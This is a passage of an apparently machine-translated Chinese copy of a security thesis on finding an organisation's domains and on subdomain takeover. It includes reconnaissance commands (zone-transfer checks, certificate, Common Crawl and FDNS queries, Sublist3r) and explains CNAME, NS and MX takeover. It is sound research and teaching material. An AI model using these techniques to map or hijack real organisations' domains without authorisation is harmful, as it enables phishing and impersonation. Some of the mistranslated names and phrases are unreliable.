src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns12.jpg" alt="此处输入图片的描述"><br>图4.1:垂直域与水平域相关的差异谷歌域</p><ul><li>垂直域相关</li></ul><p>在给定域名的情况下，垂直域关联是一个查找共享同一基本域的域的过程。此过程也称为子域枚举。</p><ul><li>水平域相关</li></ul><p>在给定域名的情况下，水平域关联是查找具有不同二级域名但与同一实体相关的其他域名的过程。</p><p>在接下来的部分中，单词target表示关联过程中感兴趣的实体。</p><h3 id="4-1-垂直域相关"><a href="#4-1-垂直域相关" class="headerlink" title="4.1 垂直域相关"></a>4.1 垂直域相关</h3><p>垂直域关联过程尝试查找目标的区域文件中指定的尽可能多的域名。最基本的方法是<strong>转储目标的DNS区域文件</strong>。由于区域文件中存在敏感信息，管理员在大多数情况下配置DNS服务器的方式是，Internet上的常规主机无法获取区域文件[CR13]。AXFR传输（区域传输）通常只允许在主DNS服务器和辅助DNS服务器之间进行。但是，有时AXFR传输仍然有效。可以使用简单的dig命令检查AXFR传输：</p><pre><code class="hljs">dig axfr @dns.server domain.name</code></pre><p>对于大多数域，这种方法失败[Int15]。因此，需要使用不同的垂直相关技术。下一节中介绍的技术旨在演示可用于此过程的不同方法。并不是唯一能为每个目标提供最佳结果集的技术</p><h4 id="4-1-1-辞典"><a href="#4-1-1-辞典" class="headerlink" title="4.1.1 辞典"></a>4.1.1 辞典</h4><p>在密码破解术语中，<strong>字典攻击</strong>被视为有限暴力攻击[Yia13]。垂直域关联在某种意义上可以看作是一个完善的密码破解问题。在垂直域关联中，目标是查找在目标DNS区域中定义的所有域名，而区域文件的内容是未知的。图4.2说明了这种类比。DNS解析程序用于验证某个域是否存在（换句话说，它是否存在于DNS区域中）。同样的二进制决定发生在密码破解过程中。因此，字典攻击可以作为垂直域关联的技术之一。</p><p>使用字典技术的过程可以简化为两个步骤：</p><p><strong>1.创建字典</strong></p><p>需要创建一个可能的域名前缀的相关词典（单词表）。前缀是没有基域的域名的子字符串。例如，的前缀之一谷歌是图像，因为images.google.com是一个现有域（2017年10月）。创建单词表的方法之一</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns13.jpg" alt="此处输入图片的描述"><br>图4.2：使用集合的领域相关技术说明。使用字典进行垂直域相关的主要目标是在这两个集合之间找到尽可能大的交集。</p><p>是考虑到域名前缀的流行性。幸运的是，有几个已经创建的单词表适合垂直域关联（请参阅第3.3节）。丹尼尔·米斯勒的秘密名单就是其中之一。Wagner等人提出了一种利用Markov链生成领域词表的不同技术。[Wag+12]。</p><p><strong>2.评估字典</strong></p><p>权威DNS服务器需要从单词表中查询每个域名，以确定该域是否存在于目标的DNS区域中。<br>此解析过程可以通过使用mass DNS解析工具（例如<a href="https://github.com/blechschmidt/massdns">massdns</a> ）或使用字典（例如<a href="https://github.com/TheRook/subbrute">subbrute</a> 或<a href="https://github.com/mschwager/fierce">fierce</a> ）的特定DNS解析工具来完成。DNS解析程序也需要考虑。大量DNS解析工具通常在不同的DNS解析程序之间进行循环。这背后的原因是，在一小段时间内发生了一些请求之后，DNS解析程序可能会停止响应。另一个原因是审查制度。一些DNS解析程序可能正在注入错误的DNS响应以阻止对所需域的访问[Lev12]。默认情况下，massdns等工具包含开放（递归）DNS解析程序的列表。开放解析器的另一个很好的来源是公共网站-域名系统信息</p><h4 id="4-1-2-SSL-证书"><a href="#4-1-2-SSL-证书" class="headerlink" title="4.1.2 SSL 证书"></a>4.1.2 SSL 证书</h4><p>如第3.2节所述，X.509证书包含名为SubjectAltName的扩展名。<br>此扩展允许在一个证书中指定多个域名。非相关域共享一个证书是很不寻常的。因此，<strong>这些域几乎总是与同一实体相关联</strong>。获取使用SSL证书的子域列表首先收集颁发给目标的所有证书。这个过程可以手动完成，方法是下载目标已知域上的证书并解析出数据。另一种方法是使用scan.io要么是Censys要么是声纳项目。这些数据集包含扫描主机上的SSL证书转储。</p><p>不幸的是，如第3.2节所述，这些证书是通过扫描IPv4主机（而不是主机名）来收集的；因此，数据集中可能缺少许多证书。</p><p>与<a href="http://www.ssl.com的证书关联的域名列表可以通过以下命令获得(在附加的存档文件中作为圣什叶州/">www.ssl.com的证书关联的域名列表可以通过以下命令获得（在附加的存档文件中作为圣什叶州</a>):</p><pre><code class="hljs">true| openssl s_client -servername www.ssl.com -connect www.ssl.com:443| openssl x509 -noout -text| grep -Eo ’DNS:[^,]+’| cut -c5-</code></pre><p>此命令返回SSL证书的SubjectAltName扩展中指定的所有域名。然而，这些域名并不局限于子域。因此，使用SSL证书的技术可以同时用于垂直域和水平域关联。</p><p>还有一个免费的网络服务叫做crt.sh，它收集提交给证书透明项目[LLK13]的证书。因为crt.sh使用不同的方法收集证书，它应该提供与来自scan.io. 另外的数据集。<br>crt.sh上的搜索功能允许使用通配符指定查询。要查找某个域的每个证书，%.前缀可用于表示所有子域。图4.3说明了这种方法。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns14.jpg" alt="此处输入图片的描述"><br>图4.3:%.ssl.com on crt.sh. 的搜索结果。屏幕截图显示在证书中找到的不同域名</p><h4 id="4-1-3-搜索引擎"><a href="#4-1-3-搜索引擎" class="headerlink" title="4.1.3 搜索引擎"></a>4.1.3 搜索引擎</h4><p>搜索引擎是另一个优秀的子域信息来源。由于搜索引擎会定期对目标网站进行爬网，新的子域通常会出现在诸如<strong>锚链接</strong>之类的HTML元素中。在ProjectSonar中，FDNS的一个来源是来自HTML的数据。然而，与搜索引擎提供的数据相比，这是一组有限的数据。搜索引擎可以对网站进行<strong>多层次的爬网</strong>，这可能会发现索引页上没有的新子域。搜索这些子域的过程非常简单。谷歌允许在搜索查询中指定高级操作员[LW07]。这项技术的另一个名字是googledorking。通过使用查询“site：ssl.com，谷歌的搜索结果将仅限于ssl.com公司以及它的所有子域[Goo17b]。从那里，很容易提取出<strong>谷歌</strong>找到的唯一子域。这种技术也可以用在<strong>Bing和Yahoo</strong>上。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns15.jpg" alt="此处输入图片的描述"><br>图4.4:Google结果页面显示了ssl.com公司</p><p>对于垂直域相关处理，可以使用普通的爬网数据来提取子域。公共爬网提供用于查询不同信息的公共restapi。其中一个可能的查询是提取在某个特定域上访问的url。幸运的是，可以使用通配符指定该域，这意味着从普通爬网获得的结果将包括不同的子域。通用爬网restapi遵循CDX服务器API[Kre17]的规范。</p><p>这个REST API 的输出是为指定域爬网的所有资源。描述一个资源的示例JSON如下所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns16.jpg" alt="此处输入图片的描述"></p><p>获取的子域列表ssl.com公司，可以使用以下shell命令（在附加的存档文件中可用common_crawl.sh):</p><pre><code class="hljs">http -b GET ’INDEX_URL/coll-cdx?url=*.ssl.com&amp;output=json’| jq -crM ’.url’| awk -F/ ’&#123;print $3&#125;’| awk -F\? ’&#123;print $1&#125;’| sort| uniq</code></pre><p>索引URL需要替换为所选爬网的API终结点。API端点可以在<a href="http://index.commoncrawl.org/">Common Crawl Index Server</a> 网站上找到。上面的命令将首先下载公共爬网（使用<a href="https://github.com/httpie/httpie">httpie</a>和jq）爬网的所有资源（以上面显示的JSON格式指定）。接下来，它从所有url中提取唯一的域名。示例使用awk、sort和uniq来执行此操作。</p><h4 id="4-1-4-Sublist3r"><a href="#4-1-4-Sublist3r" class="headerlink" title="4.1.4 Sublist3r"></a>4.1.4 Sublist3r</h4><p>处理垂直域相关过程的开源工具结合了多种技术来改进结果集。用于此任务的主要开源工具之一是sublist3r7。Sublist3r是用Python编写的，它使用10多个源代码来获取子域。这些来源包括字典（包括subbrute）和威胁情报平台（Virustotal、ThreatCrowd）和搜索引擎（Google、Yahoo、Bing）。完整的资源列表和详细信息可以在project的主页上找到。得到的子域ssl.com公司使用Sublist3r，可以使用以下命令列表：</p><pre><code class="hljs">git clone https://github.com/aboul3la/Sublist3r.gitcd Sublist3rvirtualenv venvsource venv/bin/activatepip install -r requirements.txtpython sublist3r.py -d ssl.com</code></pre><p>上面的命令将下载并安装Sublist3r 最后一个命令为启动垂直域关联ssl.com公司. 根据域的范围，此过程可能需要一段时间。最后，Sublist3r将所有结果组合到一个列表中（如图4.5所示）。<br>但是请注意，Sublist3r也使用被动源。因此，结果集可能包含不再活动的域（用NXDOMAIN状态代码响应）。massdns等工具用于排除非活动域。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns17.jpg" alt="此处输入图片的描述"><br>图4.5：Sublist3r的部分结果ssl.com公司域</p><h4 id="4-1-5-垂直域相关的FDNS"><a href="#4-1-5-垂直域相关的FDNS" class="headerlink" title="4.1.5 垂直域相关的FDNS"></a>4.1.5 垂直域相关的FDNS</h4><p>Sublist3r的一个问题是它不能大规模使用。它使用像Google这样的资源，由于异常的网络流量，在尝试几次之后，它会阻止Sublist3r的使用。在第3.2节中，Rapid7用来构建DNS解析列表的源列表。这个列表与Sublist3r的来源非常相似：HTML元素、被动DNS数据、SSL证书等等。</p><p>FDNS也可用于垂直域相关。它可以离线使用，因此可以多次使用，不会造成任何潜在的堵塞。要查找FDNS数据集中的所有子域，可以使用以下命令（在附加的存档文件中作为FDN提供fdns_vertical.sh):</p><pre><code class="hljs">zcat 20170929-fdns.json.gz| grep -F ’.ssl.com&quot;’ # double quotes indicate end-of-word| jq -crM ’if (.name | test(&quot;\\.ssl\\.com$&quot;)) then .name else empty end’| sort| uniq</code></pre><p>在上面的命令中，使用了两个过滤器：grep和jq。这背后的原因是速度。虽然jq需要将每一行解析为JSON，但grep被用来高效地查找带有字符串ssl.com在里面的行。因此，只有发现子字符串ssl.com的行被转发到jq。这种方法比将每一行解析为JSON更有效。然后，jq通过运行正则表达式来测试域的正确形式，正则表达式转换为“以.ssl.com结尾的一切”. 最后，结果集按排序排序，并且只保留唯一值（使用uniq）。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns18.jpg" alt="此处输入图片的描述"><br>表4.1：使用垂直域关联找到的子域的计数。该数字仅包括仍处于活动状态的子域（2017年10月）。</p><p>如表4.1所示，<strong>Sublist3r不一定比fdns找到更多的域</strong>。<br>在fdns中，大域往往有更多的结果，而小域往往有更多由Sublist3r提供的结果。为了实现垂直域关联，Sublist3r和fdns应该联合地使用，以增强彼此的能力。对于某些域，由于Rapid7用于域名列表的特定源，FDNS会产生更多的结果。对于其他人，Sublist3r能够找到更多，因为它有自己的特定来源。</p><h3 id="4-2-水平域相关"><a href="#4-2-水平域相关" class="headerlink" title="4.2 水平域相关"></a>4.2 水平域相关</h3><p><strong>横向域关联过程尝试查找具有不同域名结构但与目标关联的所有域名</strong>。相对于垂直域关联，水平域关联<strong>不能依赖于查找某些域名的子串或使用字典攻击</strong>（可能的选项集太大）。因此，这不是一个需要解决的小问题。</p><p>需要注意的是，本节介绍的技术可能<strong>只适用于大型域名</strong>。另一个问题是，即使获得了一些结果集，也可能包含误报，即与目标无关的域名。在垂直关联中，当子域被找到并且基域与目标域之一相等时，由于DNS委派的工作方式，它与之关联。然而，在水平域相关中并不是这样。</p><h4 id="4-2-1-原始的方法"><a href="#4-2-1-原始的方法" class="headerlink" title="4.2.1 原始的方法"></a>4.2.1 原始的方法</h4><p>最简单的想法之一是<strong>依赖虚拟主机设置</strong>。为了推迟IPv4地址用尽，创建了虚拟主机方法。在一台主机上托管多个域名（具有单个IPv4地址）<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns13.jpg">17</a>是一种想法。单个主机可能承载两个不同的域（例如google.com以及youtube.com在记录中具有相同的IP地址）。因为这两个域托管在同一主机上，常识可能会说它们与同一个实体关联。</p><p>这不一定是真的，因为网络主机和云提供商的广泛使用。一个主机可能为不同的实体服务几十个或几百个域。</p><p><strong>主机的IP地址由主机或云提供商拥有</strong>，而<strong>域则由常规组织单独注册</strong>。图4.6说明了这种情况。因此，不能可靠地使用原始的方法来假设托管在同一主机上的域也相互关联。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns19.jpg" alt="此处输入图片的描述"><br>图4.6：公共云提供商上的虚拟主机设置。即使三个域共享一个主机，它们无论如何也不会与同一个实体相关联。</p><h4 id="4-2-2-专用IP范围"><a href="#4-2-2-专用IP范围" class="headerlink" title="4.2.2 专用IP范围"></a>4.2.2 专用IP范围</h4><p>为了防止上述情况下的误报，原始方法的唯一工作方式是当目标也拥有IP地址时。名为IANA的组织将IP地址分配给区域互联网注册中心（RIR）[Küh15]。组织可以从其中一个RIR请求部分IPv4空间。这是大型组织和学术机构的常见做法。例如，谷歌的一个自主系统是AS15169（见图4.7），由ARIN（北美的RIR）注册。因此，<strong>所有在这个自治系统中有指向某个IP地址的记录的域应该属于同一个实体</strong>，在本例中，Google&#x2F;Alphabet Inc.但是请注意，任何域都可以将其A记录设置为指向此IP范围。我们必须考虑到公司也是云提供商的情况。这是谷歌的情况，他们的谷歌云平台。幸运的是，谷歌有几个自主系统，每个系统都有自己的用途。4.2.4小节描述了根据域名的IP地址范围查找域名的过程。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns20.jpg" alt="此处输入图片的描述"><br>图4.7:AS15169的IPv4前缀列表，归Google所有。</p><h4 id="4-2-3-逆向-WHOIS"><a href="#4-2-3-逆向-WHOIS" class="headerlink" title="4.2.3 逆向 WHOIS"></a>4.2.3 逆向 WHOIS</h4><p>进行水平域关联的完全不同的方法是利用<strong>WHOIS数据库</strong>[GW95]。当域名注册时，注册人的联系方式会提供给特定的域名注册中心。这通常包括公司名称、电话号码和电子邮件。对于大多数tld，可以使用WHOIS协议查询这些信息。然而，在某些情况下，这些信息是隐藏的[Blo08]。<br>反向WHOIS技术试图找到具有共享WHOIS信息的所有域。<br>如果一个公司注册了两个域名，那么他们很有可能是同一个公司。Fang等人。使用反向WHOIS技术主动查找与一个实体关联的网络钓鱼域[Fan+15]。使用reverse WHOIS查找相似域的过程如下所示：</p><p><strong>1.选择公共（枢轴）字段</strong></p><p>这个过程从一个域开始，这个域通常是目标的主域。<br>查询所选域的WHOIS数据。我们需要为整个搜索所依赖的领域找到一个好的候选者（轴心）。透视图的最佳候选对象之一是组织的地址或电子邮件地址。图4.8说明了muni.cz域。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns21.jpg" alt="此处输入图片的描述"><br>图4.8：从WHOIS数据中选择电子邮件地址muni.cz域。</p><p><strong>2.选择反向WHOIS提供者</strong></p><p>提供反向WHOIS功能的站点并不多。DomainTools提供各种域名服务，其中之一是reverse whois。然而，这是一个付费服务；价格将取决于它找到多少个域名。<br>提供反向WHOIS结果的免费服务之一是<a href="https://viewdns.info/">viewdns.info</a></p><p><strong>3.获得结果</strong><br>如前所述，最终结果集可能包含误报，即与目标无关但不知何故得到反向WHOIS结果的域。验证误报的过程来自most零件手册。这意味着验证WHOIS记录和每个域的网站内容。<br>图4.9显示了muni.cz域</p><p>虽然反向WHOIS技术的结果仍然可能包含假阳性，但它通常会产生比专用IP空间技术更好的结果。云提供商得到了广泛的利用，这意味着即使是大型公司也共享从云提供商拥有的IP地址池的IP范围。但是，域名是独立于基础架构注册的。这一事实使得反向whois适合于水平域相关。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns22.jpg" alt="此处输入图片的描述"><br>图4.9：反向WHOIS搜索结果查看dns.info. 来自WHOIS数据的电子邮件地址被选为muni.cz域。</p><h4 id="4-2-4-水平域相关的FDNS"><a href="#4-2-4-水平域相关的FDNS" class="headerlink" title="4.2.4 水平域相关的FDNS"></a>4.2.4 水平域相关的FDNS</h4><p>本节介绍了一种使用FDNS进行水平域相关的新方法。这种方法是专门为本论文开发的。</p><p>不幸的是，FDNS不包含WHOIS数据。因此，需要采用不同的方法。为尽可能防止误报，建议采用以下流程<br>1.从初始域（pivot）开始。查找中轴的所有子域的NS记录。<br>2.仅筛选属于中轴子域的NS记录。<br>3.使用NS 记录搜索FDNS中指向这些名称服务器之一的每个域。</p><p>集群中的同一个实体服务器可能会认为同一个域有足够多的公共域。但是，有多个名称服务器正在管理数千个不相关域的区域。上述过程应防止误报，原因如下：如果目标的基域和其名称服务器相同，则目标可能有自己的DNS服务器（而不是使用托管DNS提供程序）。换句话说，这些DNS服务器可能只托管目标拥有的域。这一过程可能只适用于更重要的组织或网络，它们能够托管其DNS基础设施。对于较小的目标或没有自己的DNS基础设施和专用IP空间的目标，使用反向WHOIS进程是更好的选择。</p><p>要获取pivot的所有子域的NS记录列表，可以使用以下命令（假设pivot为捷克文):</p><pre><code class="hljs">zcat 20171013-fdns.json.gz| grep -F ’.muni.cz&quot;’| jq -crM ’if (.name | test(&quot;\\.muni\\.cz$&quot;)) then . else empty end’| jq -crM ’if .type == &quot;ns&quot; then .value else empty end’| sort| uniq| grep -E ’\.muni\.cz$’ &gt; muni_nameservers.txt</code></pre><p>这将生成名称服务器的列表，这些名称服务器是pivot的子域（结合上述过程中的第一步和第二步）。最后一步是反向搜索并查找指向以下名称服务器之一的所有域名：</p><pre><code class="hljs">zcat 20171013-fdns.json.gz| grep -F ’.muni.cz&quot;’| jq -crM ’if .type == &quot;ns&quot; then . else empty end’| python ns_group.py muni_nameservers.txt| python base_domain.py| sort| uniq</code></pre><p>第一个grep用作基本过滤器。匹配记录将具有nameserver，它是muni.cz的子域. 下面的jq命令只过滤NS记录。核心功能在于ns_group.py（在附件中提供）。这个Python脚本获取NS record并检查其值（在NS record上下文中，这意味着nameserver）是否与从上一步获得的其中一个nameserver匹配。结果将包括所有域的列表，而不仅仅是基域。由于本节只讨论水平域相关性，因此子域将被忽略。可以使用名为base的脚本获取唯一基域的列表域.py（在随附的档案中提供）。然后对最终列表进行排序，只保留唯一值。</p><p>FDNS还可用于查找指向特定IP范围内IP地址的域（第4.2.2小节中介绍的技术）。首先，需要选择目标的具体IP范围。然后，名为grepcidr的命令行工具只过滤那些将value字段设置为指定集中的IP地址的A记录。<a href="https://github.com/frohoff/grepcidr">grepcidr</a>帮助查找由无类域间路由（CIDR）表示法指定的IP地址，而不是逐个筛选IP地址。</p><p>Masaryk大学是AS2852的一部分，IP范围为147.251.0.0&#x2F;16。要查找指向此IP范围的所有域，可以使用以下命令（在附加的存档文件中作为IP提供范围.sh):</p><pre><code class="hljs">zcat 20171013-fdns.json.gz| grepcidr ’147.251.0.0/16’| jq -crM ’if .type == &quot;a&quot; then .name else empty end’| python base_domain.py| sort| uniq</code></pre><p>但是请注意，任何域都可以将其A设置为该范围，从而在输出中引入潜在的误报。与第4.2.3小节所述类似，应手动验证结果列表，以确认每个域都与目标相关。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns23.jpg" alt="此处输入图片的描述"><br>表4.2：使用不同水平域相关技术发现的相关域。括号中的值表示用于特定技术的参数。</p><p>表4.2中的结果表明，对于某些领域，一种技术比另一种技术提供更多的结果。正如在本章中多次提到的那样，没有一个最佳方法适用于每个领域。结果需要进行适当检查，以确定哪种技术产生的假阳性较少。</p><p>通常，查找与目标相关的所有域名的过程都使用横向和纵向域关联技术。当使用水平域关联找到新域名时，随后运行垂直域关联以查找其所有子域。</p><h2 id="0x05-子域接管"><a href="#0x05-子域接管" class="headerlink" title="0x05 子域接管"></a>0x05 子域接管</h2><p>围绕子领域接管概念所做的广泛研究之一是由Liu等人完成的。2016年[LHW16]。本章首先解释了子域名接管的基本原理，并利用fdns扩展了前面提到的研究。</p><p>子域接管是注册一个不存在的域名以获得对另一个域的控制的过程。此过程最常见的情况如下：</p><p>1.域名（例如sub.example.com)使用CNAME记录到另一个域（例如sub.example.com CNAME anotherdomain.com).<br>2.在某个时间点上，另一个域名过期，任何人都可以注册。<br>3.因为CNAME记录没有从中删除example.com网站DNS区域，任何注册的人另一个域名完全控制sub.example.com网站直到DNS记录出现。</p><p>子域名收购的影响可能相当重大。利用子域接管，攻击者可以从合法域发送网络钓鱼电子邮件，执行跨站点脚本（XSS），或损害与该域关联的品牌的声誉。第5.4节对影响进行了大量讨论。</p><p>这种情况并不是纯粹的假设，事实上，第5.3节显示了互联网上子域接管的普遍性。根据上下文，子域接管可能被解释为漏洞、配置错误或人为错误。</p><p>子域接管不限于CNAME记录。NS、MX甚至A记录（不受本章约束）也会受到影响。本章主要讨论CNAME记录。但是，在需要的地方提供了NS和MX记录的用例。图5.1将在本章的其余部分解释注释。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns24.jpg" alt="此处输入图片的描述"><br>图5.1：用于引用CNAME记录不同部分的符号</p><h3 id="5-1-正则域"><a href="#5-1-正则域" class="headerlink" title="5.1 正则域"></a>5.1 正则域</h3><p>使用CNAME记录的DNS委派对用户是完全透明的，即在DNS解析过程中在后台进行。图5.2说明了具有CNAME记录的域名的web浏览器行为。请注意**，web浏览器隐式地信任DNS解析程序返回的任何内容**。这种信任意味着当攻击者获得对DNS记录的控制时，所有web浏览器安全措施（例如，同源策略）都将被绕过[Ker16]。由于子域接管破坏了域的真实性，这就造成了相当大的安全威胁，攻击者可以通过多种方式利用该域。如第5.4节所示，TLS&#x2F;SSL不能解决这个问题，因为子域接管不是常规的中间人攻击。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns25.jpg" alt="此处输入图片的描述"><br>图5.2：从web浏览器的角度看DNS解析过程。请注意，步骤7请求sub.example.com 而不是anotherdomain.com 这是因为web浏览器没有意识到另一个域名甚至存在。即使使用了CNAME记录，浏览器中的URL栏仍将包含sub.example.com网站.</p><h4 id="CNAME-子域名接管"><a href="#CNAME-子域名接管" class="headerlink" title="CNAME 子域名接管"></a><strong>CNAME 子域名接管</strong></h4><p>CNAME子域接管的主要类型之一是当一个规范的域名是一个普通的互联网域名（不是云提供商拥有的域名，如第5.2节所述）。</p><p>检测某个源域名是否易受CNAME子域接管攻击的过程非常简单：</p><p>给定源域名和规范域名对，如果规范域名的基域可供注册，则源域名容易被子域接管。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns26.jpg" alt="此处输入图片的描述"><br>图5.3：流程图描述了一个简单的决策过程，用于确定源域名是否易受子域接管的攻击。</p><p>在此过程中值得注意的是“规范域名的基本域”。这是因为规范域名的形式可能是更高级别的域。<br>域名注册后可以很容易地在更高级别的域名中重新创建域名。</p><p>检查基本域名的可用性可以通过使用域名注册器（如GoDaddy 或namescheap ）来实现。人们可能会认为，测试NXDOMAIN的DNS响应状态就足以表明域名可以注册。<br>但是请注意，事实并非如此，因为有些情况下，域名以NXDOMAIN响应，但无法注册。原因包括受限制的顶级域名（例如.GOV，.MIL）或TLD注册商保留的域名。</p><h4 id="NS-子域接管"><a href="#NS-子域接管" class="headerlink" title="NS 子域接管"></a><strong>NS 子域接管</strong></h4><p>子域接管的概念可以自然地扩展到NS记录：如果至少有一个NS记录的规范域名的基域可供注册，则源域名容易被子域接管。</p><p>使用NS-record进行子域接管的一个问题是源域名通常有多个NS记录。多个NS记录用于冗余和负载平衡。名称服务器是在DNS解析之前随机选择的。假设域sub.example.com 有两个NS记录：ns.vulnerable.com网站和ns.non-ulnerable.com网站. 如果攻击者接管了ns.vulnerable.com网站，情况来自查询用户的视角sub.example.com网站如下所示：</p><ul><li>因为有两个名称服务器，所以随机选择一个。攻击者的查询概率为50%。</li><li>如果用户的DNS解析程序选择ns.non-ulnerable.com网站（合法的名称服务器），则返回正确的结果，并且可能被缓存在6到24小时之间。</li><li>如果用户的DNS解析程序选择易受攻击的（nameserver归攻击者所有），攻击者可能会提供一个错误的结果，该结果也将被缓存。由于攻击者控制了nameserver，因此她可以将此特定结果的TTL设置为例如一周。</li></ul><p>每次缓存项过期时，都会重复上述过程。当攻击者选择使用高值的TTL时，假结果将在DNS缓存中保留一段时间。</p><p>在此期间，所有请求sub.example.com网站将使用攻击者缓存的错误DNS结果。当使用公共DNS解析程序（例如googledns）时，这种想法甚至会被放大。在这种情况下，公共解析程序可能会缓存错误的结果，这意味着所有使用同一DNS解析程序的用户都将获得错误的结果，直到缓存被撤销。</p><p>除了对源域名的控制外，还获得了对源域名所有高级域的控制权。这是因为拥有NS record的规范域名意味着拥有源域名的完整DNS区域。</p><p>2016年，Matthew Bryant在马里斯国际酒店[Bry16]。INT顶级域是一个特殊的TLD，只有少数几个域在使用它。布莱恩特指出，即使这些域名的注册是由IANA独家批准的，名称服务器也可以设置为任意域。因为马里斯国际酒店名称服务器可用于注册(cobalt.aliis.be)，即使在这个受限制的TLD上也可以进行子域接管。</p><p>布莱恩特还展示了更严重的攻击，他能够控制.IO顶级域的名称服务器[Bry17]。获得对.IO的控制意味着控制所有.IO域名的响应。在本例中，.IO名称服务器之一是可以注册的ns-a1.IO。通过注册ns-a1.io，布莱恩特能够接收DNS查询并控制它们对所有.io域的响应。</p><h4 id="MX-子域接管"><a href="#MX-子域接管" class="headerlink" title="MX 子域接管"></a>MX 子域接管</h4><p>与NS和CNAME子域收购相比，MX子域收购的影响最小。由于MX记录仅用于接收电子邮件，因此获得对MX记录中规范域名的控制权只<strong>允许攻击者接收发往源域名的电子邮件</strong>。虽然影响不如CNAME或NS子域收购那么大，但MX子域收购可能会在鱼叉式网络钓鱼攻击（如第5.4节所述）和知识产权窃取中发挥作用。</p><h3 id="5-2-云提供商"><a href="#5-2-云提供商" class="headerlink" title="5.2 云提供商"></a>5.2 云提供商</h3><p>近年来，云服务越来越受欢迎[Wei17]。云的一个基本前提是减轻用户建立自己的基础设施的负担。组织正在从内部部署转向其他替代方案，如云存储、云中的电子商务和平台即服务，仅举几个例子。</p><p>用户创建新的云服务后，云提供商在大多数情况下会生成唯一的域名，用于访问创建的资源。由于大量的云服务客户，通过TLD注册器注册域名不太方便，云提供商选择使用子域。标识唯一云资源的子域通常以-customer.cloudprovider.com，其中cloudprovider.com网站是特定云提供商拥有的基域。</p><p>如果某个组织注册的云服务是公共的（例如，电子商务商店），那么特定的组织可能希望将其作为其域的一部分出现。这背后的主要原因是品牌：shop.organization.com网站看起来比organization.ecommerceprovider.com. 更好。在这种情况下，组织有两种选择：</p><ul><li>HTTP 301&#x2F;302重定向</li></ul><p>301和302是HTTP响应代码，它们触发web浏览器将当前URL重定向到另一个URL。在云服务的上下文中，第一个请求是对组织的域名（例如shop.organization.com)然后重定向到云提供商的域名（例如organization.ecommerceprovider.com).</p><ul><li>CNAME记录</li></ul><p>使用此方法，“重定向”发生在DNS解析过程中（如图5.2所示）。<br>组织设置CNAME记录，所有流量自动委托给云提供商。使用此方法，用户浏览器中的URL保持不变。但是请注意，特定的云服务必须支持使用CNAME记录的委派。</p><p>如果使用CNAME记录方法，子域接管的可能性就会发挥作用。尽管云提供商拥有一个规范域名的基域，但子域名接管仍然是可能的，如下面几节所述。</p><p>以下章节中的提供者是基于以下三个主要原因选择的：</p><p>1.流行率<br>基于第3.3节CNAME记录的统计数据，CNAME记录中使用率最高的云提供商域被优先考虑。</p><p>2.支持CNAME记录<br>如上所述，云提供商需要支持CNAME委托。云提供商意识到客户要求这样的行为，而最流行的云提供商已经支持这种行为。</p><p>3.域所有权验证</p><p>所选云提供商未验证源域的所有权姓名。由于所有者不需要被证明，任何人都可以使用过期的云配置来实现子域接管。</p><h4 id="5-2-1-亚马逊CloudFront"><a href="#5-2-1-亚马逊CloudFront" class="headerlink" title="5.2.1 亚马逊CloudFront"></a>5.2.1 亚马逊CloudFront</h4><p>amazoncloudfront是amazonwebservices（AWS）[Ama17b]中的一个内容交付网络（CDN）。CDN将web内容的副本分发到位于不同地理位置（称为存在点）的服务器。当用户向CDN发出请求时，根据访问者的位置选择最近的存在点以降低延迟[Imp17]。CDN被组织使用，主要用于分发媒体文件，如视频、音频和图像。cdn的其他优点包括拒绝服务攻击保护、减少带宽和在高流量峰值情况下的负载平衡。</p><p>CloudFront使用amazon S3作为web内容的主要来源[Ama17b]。亚马逊S3提供了另一项服务。这是一个云存储服务（S3是简单存储服务的缩写），它允许用户将文件上传到所谓的bucket中，bucket是S3中逻辑组的名称。</p><p>CloudFront使用分布的概念。每个发行版都是指向特定amazonS3 